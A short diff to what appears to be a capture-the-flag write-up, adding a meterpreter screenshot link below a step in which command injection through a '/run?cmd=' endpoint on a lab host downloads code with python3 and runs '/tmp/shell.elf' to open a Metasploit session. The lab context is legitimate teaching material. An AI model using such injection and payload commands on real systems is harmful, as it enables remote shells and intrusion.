@@ -112,6 +112,8 @@ curl "http://ctf-target:5000/run?cmd=python3+-c+'import+urllib.request%3Burllib.
 curl "http://ctf-target:5000/run?cmd=/tmp/shell.elf"
  ```
  This then open a connection with metasploit.
+ <img src="/lab3/meterpreter.png" alt="Res1" style="max-width: 500px; width: 100%;">
+
 
  ## FLAGS
  For the flags I know there are two flags "open" and one that only root can access - classic CTF
